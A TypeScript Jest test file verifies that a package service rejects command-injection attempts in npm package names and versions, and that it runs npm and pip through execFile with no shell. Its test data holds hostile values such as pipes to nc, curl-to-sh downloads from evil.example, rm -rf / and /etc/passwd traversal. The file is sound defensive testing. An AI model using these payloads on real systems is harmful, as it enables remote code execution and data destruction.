import * as path from 'path'
import * as util from 'util'
import * as childProcess from 'child_process'
import { existsSync, mkdir, readFile, rm } from 'fs-extra'
import { PackageInfo, PackageService } from '../src/services/packages'
import { MCPService } from '../src/services/mcp'
import { MongoConnectionParams } from '../src/utils/mongodb'

jest.mock('child_process', () => {
  const nodeUtil = require('util') as typeof import('util')
  const exec = jest.fn()
  const execFile = jest.fn()
  const execPromisified = jest.fn()
  const execFilePromisified = jest.fn()
  ;(exec as unknown as Record<symbol, unknown>)[nodeUtil.promisify.custom] = execPromisified
  ;(execFile as unknown as Record<symbol, unknown>)[nodeUtil.promisify.custom] = execFilePromisified
  return { exec, execFile }
})

jest.mock('fs-extra', () => ({
  existsSync: jest.fn(),
  mkdir: jest.fn(),
  readFile: jest.fn(),
  rm: jest.fn()
}))

type ExecResult = { stdout: string; stderr: string }

type DbMock = {
  upsert: jest.Mock<Promise<unknown>, [Partial<PackageInfo> | PackageInfo, Record<string, unknown>]>
  update: jest.Mock<Promise<unknown>, [Partial<PackageInfo> | PackageInfo, Record<string, unknown>]>
  find: jest.Mock<Promise<PackageInfo[]>, [Record<string, unknown>]>
  findOne: jest.Mock<Promise<PackageInfo | null>, [Record<string, unknown>]>
  delete: jest.Mock<Promise<unknown>, [Record<string, unknown>, boolean?]>
}

type McpServiceMock = {
  addServer: jest.Mock
  getServer: jest.Mock
  disableServer: jest.Mock
  enableServer: jest.Mock
  updateServer: jest.Mock
  deleteServer: jest.Mock
}

const mongoParams: MongoConnectionParams = {
  host: 'mongodb://localhost:27017',
  db: 'test',
  user: 'test',
  pass: 'test'
}

const execPromisifiedMock = (
  childProcess.exec as unknown as Record<typeof util.promisify.custom, jest.Mock<Promise<ExecResult>, unknown[]>>
)[util.promisify.custom]
const execFilePromisifiedMock = (
  childProcess.execFile as unknown as Record<typeof util.promisify.custom, jest.Mock<Promise<ExecResult>, unknown[]>>
)[util.promisify.custom]
const existsSyncMock = existsSync as unknown as jest.Mock
const mkdirMock = mkdir as unknown as jest.Mock
const readFileMock = readFile as unknown as jest.Mock
const rmMock = rm as unknown as jest.Mock

const createService = (): {
  service: PackageService
  dbMock: DbMock
  mcpMock: McpServiceMock
} => {
  const mcpMock: McpServiceMock = {
    addServer: jest.fn().mockResolvedValue({
      name: 'srv',
      transportType: 'stdio',
      command: 'node',
      args: [],
      env: {},
      status: 'disconnected',
      enabled: true
    }),
    getServer: jest.fn(),
    disableServer: jest.fn(),
    enableServer: jest.fn(),
    updateServer: jest.fn(),
    deleteServer: jest.fn()
  }
  const service = new PackageService({
    mongoParams,
    mcpService: mcpMock as unknown as MCPService
  })

  const dbMock: DbMock = {
    upsert: jest.fn().mockResolvedValue({}),
    update: jest.fn().mockResolvedValue({}),
    find: jest.fn().mockResolvedValue([]),
    findOne: jest.fn().mockResolvedValue(null),
    delete: jest.fn().mockResolvedValue({})
  }

  ;(service as unknown as { packagesDBClient: DbMock }).packagesDBClient = dbMock

  return { service, dbMock, mcpMock }
}

describe('PackageService command-injection hardening', () => {
  beforeEach(() => {
    jest.clearAllMocks()
    existsSyncMock.mockReturnValue(false)
    mkdirMock.mockResolvedValue(undefined)
    readFileMock.mockResolvedValue('{}')
    rmMock.mockResolvedValue(undefined)
    execPromisifiedMock.mockResolvedValue({ stdout: '', stderr: '' })
    execFilePromisifiedMock.mockResolvedValue({ stdout: '', stderr: '' })
  })

  describe('installPackage version validation', () => {
    const maliciousVersions = [
      '0.0.0 & echo POC>%TEMP%\\mcp-api-version-cmdi-poc.txt & rem',
      '1.0.0; touch /tmp/pwn',
      '1.0.0 | nc evil.example 4444',
      '1.0.0`whoami`',
      '1.0.0$(id)',
      '1.0.0\nrm -rf /',
      '--registry=http://evil.example',
      '-g',
      '1.0.0 && curl http://evil.example/x.sh | sh'
    ]

    test.each(maliciousVersions)('rejects malicious version %p', async (malicious) => {
      const { service } = createService()

      const result = await service.installPackage({
        name: 'left-pad',
        version: malicious,
        serverName: 'left-pad-server'
      })

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/version/i)
      // Should never spawn an install if validation failed
      const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
        Array.isArray(args) && (args as string[])[0] === 'install'
      )
      expect(installCalls.length).toBe(0)
      const execInstallCalls = execPromisifiedMock.mock.calls.filter(([cmd]) =>
        typeof cmd === 'string' && (cmd as string).startsWith('npm install')
      )
      expect(execInstallCalls.length).toBe(0)
    })

    const validVersions = ['1.2.3', '^1.2.3', '~1.0.0', '>=1.0.0', '1.x', '*', 'latest', 'beta', '1.0.0-alpha.1']
    test.each(validVersions)('accepts valid version %p', async (valid) => {
      const { service } = createService()

      const result = await service.installPackage({
        name: 'left-pad',
        version: valid,
        serverName: 'left-pad-server'
      })

      expect(result.success).toBe(true)
    })

    // The API documents `version` as "optional, defaults to latest". Clients
    // (including the GUI) send "" or null to mean "no specific version", and
    // before the injection hardening any falsy version installed latest.
    // These inputs must NOT be rejected by the version allowlist.
    const emptyVersions: Array<[string, unknown]> = [
      ['empty string', ''],
      ['whitespace string', '   '],
      ['null', null],
      ['undefined', undefined]
    ]
    test.each(emptyVersions)('treats %s version as "install latest"', async (_label, empty) => {
      const { service } = createService()

      const result = await service.installPackage({
        name: 'left-pad',
        version: empty as string | undefined,
        serverName: 'left-pad-server'
      })

      expect(result.success).toBe(true)

      // The install spec must be the bare package name (no trailing @).
      const installCall = execFilePromisifiedMock.mock.calls.find(([, args]) =>
        Array.isArray(args) && (args as string[]).includes('install')
      )
      expect(installCall).toBeDefined()
      const cmdArgs = installCall![1] as string[]
      expect(cmdArgs[cmdArgs.length - 1]).toBe('left-pad')
    })

    // Non-string version types must be rejected, not coerced to strings —
    // `true` must never install the npm tag "true".
    const nonStringVersions: Array<[string, unknown]> = [
      ['boolean', true],
      ['number', 123],
      ['object', { version: '1.2.3' }],
      ['array', ['1.2.3']]
    ]
    test.each(nonStringVersions)('rejects non-string version type (%s)', async (_label, bad) => {
      const { service } = createService()

      const result = await service.installPackage({
        name: 'left-pad',
        version: bad as unknown as string,
        serverName: 'left-pad-server'
      })

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/version/i)
      const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
        Array.isArray(args) && (args as string[]).includes('install')
      )
      expect(installCalls.length).toBe(0)
    })

    test('upgradePackage rejects non-string version type', async () => {
      const { service, dbMock } = createService()
      dbMock.findOne.mockResolvedValue({
        name: 'left-pad',
        version: '1.0.0',
        installPath: 'packages/left-pad',
        status: 'installed',
        installed: new Date('2025-01-01T00:00:00.000Z'),
        mcpServerId: 'left-pad-server',
        enabled: true,
        runtime: 'node'
      })

      const result = await service.upgradePackage('left-pad-server', true as unknown as string)

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/version/i)
      const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
        Array.isArray(args) && (args as string[]).includes('install')
      )
      expect(installCalls.length).toBe(0)
    })

    test('trims surrounding whitespace from an otherwise valid version', async () => {
      const { service } = createService()

      const result = await service.installPackage({
        name: 'left-pad',
        version: ' 1.2.3 ',
        serverName: 'left-pad-server'
      })

      expect(result.success).toBe(true)
      const installCall = execFilePromisifiedMock.mock.calls.find(([, args]) =>
        Array.isArray(args) && (args as string[]).includes('install')
      )
      expect(installCall).toBeDefined()
      const cmdArgs = installCall![1] as string[]
      expect(cmdArgs[cmdArgs.length - 1]).toBe('left-pad@1.2.3')
    })
  })

  test('installPackage uses execFile (not shell exec) for npm install with package and version as separate spec arg', async () => {
    const { service } = createService()

    const result = await service.installPackage({
      name: 'left-pad',
      version: '1.2.3',
      serverName: 'left-pad-server'
    })

    expect(result.success).toBe(true)

    // The shell-form `exec` MUST NOT be used to run `npm install ...`
    const shellInstallCalls = execPromisifiedMock.mock.calls.filter(([cmd]) =>
      typeof cmd === 'string' && (cmd as string).startsWith('npm install')
    )
    expect(shellInstallCalls.length).toBe(0)

    // execFile must be called with `npm install left-pad@1.2.3` as separate args
    const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
      Array.isArray(args) && (args as string[]).includes('install')
    )
    expect(installCalls.length).toBeGreaterThan(0)
    const installCall = installCalls[0]
    const cmd = installCall[0] as string
    const cmdArgs = installCall[1] as string[]
    expect(cmd === 'npm' || cmd === 'npm.cmd').toBe(true)
    expect(cmdArgs).toEqual(['install', 'left-pad@1.2.3'])
  })

  test('installPackage uses execFile to initialize package.json (no shell)', async () => {
    const { service } = createService()

    await service.installPackage({
      name: 'left-pad',
      serverName: 'left-pad-server'
    })

    // The shell-form `exec` MUST NOT be used to run `npm init`
    const shellInitCalls = execPromisifiedMock.mock.calls.filter(([cmd]) =>
      typeof cmd === 'string' && (cmd as string).startsWith('npm init')
    )
    expect(shellInitCalls.length).toBe(0)

    const initCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
      Array.isArray(args) && (args as string[])[0] === 'init'
    )
    expect(initCalls.length).toBe(1)
    expect(initCalls[0][1]).toEqual(['init', '-y'])
  })

  describe('upgradePackage version validation', () => {
    const existingPackage: PackageInfo = {
      name: 'left-pad',
      version: '1.0.0',
      installPath: 'packages/left-pad',
      status: 'installed',
      installed: new Date('2025-01-01T00:00:00.000Z'),
      mcpServerId: 'left-pad-server',
      enabled: true,
      runtime: 'node'
    }

    test('upgradePackage rejects malicious version', async () => {
      const { service, dbMock } = createService()
      dbMock.findOne.mockResolvedValue({ ...existingPackage })

      const result = await service.upgradePackage('left-pad-server', '0.0.0 & echo POC & rem')

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/version/i)
      const upgradeCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
        Array.isArray(args) && (args as string[])[0] === 'install'
      )
      expect(upgradeCalls.length).toBe(0)
      const shellUpgradeCalls = execPromisifiedMock.mock.calls.filter(([cmd]) =>
        typeof cmd === 'string' && (cmd as string).startsWith('npm install')
      )
      expect(shellUpgradeCalls.length).toBe(0)
    })

    test('upgradePackage uses execFile to run npm install', async () => {
      const { service, dbMock, mcpMock } = createService()
      dbMock.findOne.mockResolvedValue({ ...existingPackage })

      mcpMock.getServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: ['./packages/left-pad/node_modules/left-pad/index.js'],
        env: {},
        status: 'connected',
        enabled: true
      })
      mcpMock.disableServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: [],
        env: {},
        status: 'disconnected',
        enabled: false
      })
      mcpMock.enableServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: ['./packages/left-pad/node_modules/left-pad/index.js'],
        env: {},
        status: 'connected',
        enabled: true
      })
      mcpMock.updateServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: ['./packages/left-pad/node_modules/left-pad/index.js'],
        env: {},
        status: 'connected',
        enabled: true
      })
      readFileMock.mockResolvedValue(JSON.stringify({ version: '1.5.0', main: 'index.js' }))

      const result = await service.upgradePackage('left-pad-server', '1.5.0')

      expect(result.success).toBe(true)

      // No `npm install` via shell-form exec
      const shellInstallCalls = execPromisifiedMock.mock.calls.filter(([cmd]) =>
        typeof cmd === 'string' && (cmd as string).startsWith('npm install')
      )
      expect(shellInstallCalls.length).toBe(0)

      // execFile invoked with proper args
      const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
        Array.isArray(args) && (args as string[]).includes('install')
      )
      expect(installCalls.length).toBeGreaterThan(0)
      const cmdArgs = installCalls[0][1] as string[]
      expect(cmdArgs).toEqual(['install', 'left-pad@1.5.0'])
    })

    test('upgradePackage with no version uses @latest spec via execFile', async () => {
      const { service, dbMock, mcpMock } = createService()
      dbMock.findOne.mockResolvedValue({ ...existingPackage })

      mcpMock.getServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: ['./packages/left-pad/node_modules/left-pad/index.js'],
        env: {},
        status: 'connected',
        enabled: true
      })
      mcpMock.disableServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: [],
        env: {},
        status: 'disconnected',
        enabled: false
      })
      mcpMock.enableServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: ['./packages/left-pad/node_modules/left-pad/index.js'],
        env: {},
        status: 'connected',
        enabled: true
      })
      mcpMock.updateServer.mockResolvedValue({
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: ['./packages/left-pad/node_modules/left-pad/index.js'],
        env: {},
        status: 'connected',
        enabled: true
      })
      readFileMock.mockResolvedValue(JSON.stringify({ version: '2.0.0', main: 'index.js' }))

      const result = await service.upgradePackage('left-pad-server')

      expect(result.success).toBe(true)

      const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
        Array.isArray(args) && (args as string[]).includes('install')
      )
      expect(installCalls.length).toBeGreaterThan(0)
      const cmdArgs = installCalls[0][1] as string[]
      expect(cmdArgs).toEqual(['install', 'left-pad@latest'])
    })

    test('upgradePackage treats empty-string version as "upgrade to latest"', async () => {
      const { service, dbMock, mcpMock } = createService()
      dbMock.findOne.mockResolvedValue({ ...existingPackage })

      const serverShape = {
        name: 'left-pad-server',
        transportType: 'stdio',
        command: 'node',
        args: ['./packages/left-pad/node_modules/left-pad/index.js'],
        env: {},
        status: 'connected',
        enabled: true
      }
      mcpMock.getServer.mockResolvedValue({ ...serverShape })
      mcpMock.disableServer.mockResolvedValue({ ...serverShape, status: 'disconnected', enabled: false })
      mcpMock.enableServer.mockResolvedValue({ ...serverShape })
      mcpMock.updateServer.mockResolvedValue({ ...serverShape })
      readFileMock.mockResolvedValue(JSON.stringify({ version: '2.0.0', main: 'index.js' }))

      const result = await service.upgradePackage('left-pad-server', '')

      expect(result.success).toBe(true)

      const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
        Array.isArray(args) && (args as string[]).includes('install')
      )
      expect(installCalls.length).toBeGreaterThan(0)
      const cmdArgs = installCalls[0][1] as string[]
      expect(cmdArgs).toEqual(['install', 'left-pad@latest'])
    })
  })

  test('checkForUpdates uses execFile (not shell exec) for npm view', async () => {
    const { service, dbMock } = createService()
    dbMock.find.mockResolvedValue([
      {
        name: '@missionsquad/mcp-github',
        version: '1.0.0',
        installPath: 'packages/mcp-github',
        status: 'installed',
        installed: new Date('2025-01-01T00:00:00.000Z'),
        mcpServerId: 'github-server',
        enabled: true,
        runtime: 'node'
      }
    ])

    execFilePromisifiedMock.mockImplementation(async (...args: unknown[]) => {
      const cmd = args[0] as string
      const cmdArgs = (args[1] as string[]) ?? []
      if ((cmd === 'npm' || cmd === 'npm.cmd') && cmdArgs[0] === 'view') {
        return { stdout: '1.1.0\n', stderr: '' }
      }
      return { stdout: '', stderr: '' }
    })

    const result = await service.checkForUpdates()

    expect(result.updates).toEqual([
      {
        serverName: 'github-server',
        currentVersion: '1.0.0',
        latestVersion: '1.1.0',
        updateAvailable: true
      }
    ])

    // No `npm view` via shell-form exec
    const shellViewCalls = execPromisifiedMock.mock.calls.filter(([cmd]) =>
      typeof cmd === 'string' && (cmd as string).startsWith('npm view')
    )
    expect(shellViewCalls.length).toBe(0)

    // execFile invoked with `view <name> version` args
    const viewCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
      Array.isArray(args) && (args as string[])[0] === 'view'
    )
    expect(viewCalls.length).toBe(1)
    expect(viewCalls[0][1]).toEqual(['view', '@missionsquad/mcp-github', 'version'])
  })

  describe('package name validation', () => {
    test.each([
      'left-pad; rm -rf /',
      'left-pad && curl evil',
      'left-pad | nc evil 4444',
      'left-pad`whoami`',
      'left-pad$(id)',
      '-rf',
      '../escape',
      'PKG WITH SPACES',
      '../../../../etc/passwd'
    ])('installPackage rejects malicious name %p', async (malicious) => {
      const { service } = createService()

      const result = await service.installPackage({
        name: malicious,
        version: '1.2.3',
        serverName: 'some-server'
      })

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/Invalid package name/i)
      // No npm install must have been attempted
      const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
        Array.isArray(args) && (args as string[]).includes('install')
      )
      expect(installCalls.length).toBe(0)
    })

    test('upgradePackage rejects persisted package with invalid name', async () => {
      const { service, dbMock } = createService()
      dbMock.findOne.mockResolvedValue({
        name: 'evil; touch /tmp/pwn',
        version: '1.0.0',
        installPath: 'packages/evil',
        status: 'installed',
        installed: new Date('2025-01-01T00:00:00.000Z'),
        mcpServerId: 'evil-server',
        enabled: true,
        runtime: 'node'
      })

      const result = await service.upgradePackage('evil-server', '1.2.3')

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/Invalid package name/i)
      const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
        Array.isArray(args) && (args as string[]).includes('install')
      )
      expect(installCalls.length).toBe(0)
    })

    test('checkForUpdates still checks python packages with uppercase names via pip', async () => {
      // PyPI names may legally contain uppercase letters; they must not be
      // filtered out by the npm name allowlist.
      const { service, dbMock } = createService()
      dbMock.find.mockResolvedValue([
        {
          name: 'MarkupSafe',
          version: '2.0.0',
          installPath: 'packages/python/markupsafe-server',
          venvPath: 'packages/python/markupsafe-server',
          status: 'installed',
          installed: new Date('2025-01-01T00:00:00.000Z'),
          mcpServerId: 'markupsafe-server',
          enabled: true,
          runtime: 'python'
        }
      ])

      execFilePromisifiedMock.mockImplementation(async (...args: unknown[]) => {
        const cmdArgs = (args[1] as string[]) ?? []
        if (cmdArgs[0] === 'index' && cmdArgs[1] === 'versions') {
          // Mirrors real `pip index versions <name>` output, which
          // pipIndexLatestVersion parses by locating the line starting with
          // "Available versions:" and taking the first comma-separated entry.
          return { stdout: 'Available versions: 3.0.0, 2.0.0\n', stderr: '' }
        }
        return { stdout: '', stderr: '' }
      })

      const result = await service.checkForUpdates()

      expect(result.updates).toEqual([
        {
          serverName: 'markupsafe-server',
          currentVersion: '2.0.0',
          latestVersion: '3.0.0',
          updateAvailable: true
        }
      ])
    })

    test('upgradePackage allows python packages with uppercase names', async () => {
      const { service, dbMock, mcpMock } = createService()
      dbMock.findOne.mockResolvedValue({
        name: 'MarkupSafe',
        version: '2.0.0',
        installPath: 'packages/python/markupsafe-server',
        venvPath: 'packages/python/markupsafe-server',
        status: 'installed',
        installed: new Date('2025-01-01T00:00:00.000Z'),
        mcpServerId: 'markupsafe-server',
        enabled: false,
        runtime: 'python',
        pythonModule: 'markupsafe'
      })
      mcpMock.getServer.mockResolvedValue({
        name: 'markupsafe-server',
        transportType: 'stdio',
        command: 'python',
        args: ['-u', '-m', 'markupsafe'],
        env: {},
        status: 'disconnected',
        enabled: false
      })

      execFilePromisifiedMock.mockImplementation(async (...args: unknown[]) => {
        const cmdArgs = (args[1] as string[]) ?? []
        if (cmdArgs[0] === 'show') {
          return { stdout: 'Name: MarkupSafe\nVersion: 3.0.0\n', stderr: '' }
        }
        return { stdout: '', stderr: '' }
      })

      const result = await service.upgradePackage('markupsafe-server')

      expect(result.success).toBe(true)
      expect(result.package?.version).toBe('3.0.0')

      // Confirm the pip code path actually ran: the upgrade must go through
      // `pip install --upgrade MarkupSafe` and the new version must have been
      // read from `pip show MarkupSafe` (not from a node package.json).
      const pipInstallCall = execFilePromisifiedMock.mock.calls.find(([, args]) =>
        Array.isArray(args) &&
        (args as string[])[0] === 'install' &&
        (args as string[]).includes('--upgrade') &&
        (args as string[]).includes('MarkupSafe')
      )
      expect(pipInstallCall).toBeDefined()
      const pipShowCall = execFilePromisifiedMock.mock.calls.find(([, args]) =>
        Array.isArray(args) && (args as string[])[0] === 'show'
      )
      expect(pipShowCall).toBeDefined()
      expect(pipShowCall![1]).toEqual(['show', 'MarkupSafe'])
    })

    test('checkForUpdates skips packages with invalid persisted names', async () => {
      const { service, dbMock } = createService()
      dbMock.find.mockResolvedValue([
        {
          name: 'evil | calc',
          version: '1.0.0',
          installPath: 'packages/evil',
          status: 'installed',
          installed: new Date('2025-01-01T00:00:00.000Z'),
          mcpServerId: 'evil-server',
          enabled: true,
          runtime: 'node'
        }
      ])

      const result = await service.checkForUpdates()

      // The malicious name must not have produced an npm subprocess
      const viewCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
        Array.isArray(args) && (args as string[])[0] === 'view'
      )
      expect(viewCalls.length).toBe(0)
      expect(result.updates).toEqual([
        {
          serverName: 'evil-server',
          currentVersion: '1.0.0',
          latestVersion: 'unknown',
          updateAvailable: false
        }
      ])
    })
  })

  describe('runNpm invocation strategy', () => {
    test('uses node + npm-cli.js (shell:false) when npm-cli.js is locatable', async () => {
      // Pretend npm-cli.js exists at the first candidate location. The
      // service should invoke `node <cliPath> install <spec>` with shell
      // disabled, bypassing npm.cmd / cmd.exe entirely on Windows.
      existsSyncMock.mockReturnValue(true)

      const { service } = createService()

      const result = await service.installPackage({
        name: 'left-pad',
        version: '1.2.3',
        serverName: 'left-pad-server'
      })

      expect(result.success).toBe(true)

      // Locate the install call. Args must contain `install` and the spec
      // as discrete argv tokens, and the shell option must be `false`.
      const installCall = execFilePromisifiedMock.mock.calls.find(([, args]) =>
        Array.isArray(args) && (args as string[]).includes('install') && (args as string[]).includes('left-pad@1.2.3')
      )
      expect(installCall).toBeDefined()

      const cmd = installCall![0] as string
      const cmdArgs = installCall![1] as string[]
      const opts = installCall![2] as { shell?: boolean } | undefined

      // Command should be node (process.execPath), not npm/npm.cmd.
      expect(cmd).toBe(process.execPath)
      // First arg must be the resolved npm-cli.js path; install/spec follow.
      expect(cmdArgs[0]).toMatch(/npm-cli\.js$/)
      expect(cmdArgs.slice(1)).toEqual(['install', 'left-pad@1.2.3'])
      // shell must be false — no cmd.exe in the picture.
      expect(opts?.shell).toBe(false)
    })

    test('falls back to direct npm invocation when npm-cli.js is not locatable', async () => {
      // existsSyncMock defaults to false in beforeEach, so the lookup fails.
      const { service } = createService()

      const result = await service.installPackage({
        name: 'left-pad',
        version: '1.2.3',
        serverName: 'left-pad-server'
      })

      expect(result.success).toBe(true)

      const installCall = execFilePromisifiedMock.mock.calls.find(([cmd, args]) =>
        (cmd === 'npm' || cmd === 'npm.cmd') &&
        Array.isArray(args) && (args as string[])[0] === 'install'
      )
      expect(installCall).toBeDefined()
      expect(installCall![1]).toEqual(['install', 'left-pad@1.2.3'])
      const opts = installCall![2] as { shell?: boolean } | undefined
      // Unix fallback uses shell:false; Windows fallback uses shell:true.
      // The test runs under Jest in this repo (Linux/macOS in CI), so we
      // expect shell:false here.
      expect(opts?.shell).toBe(process.platform === 'win32')
    })
  })
})
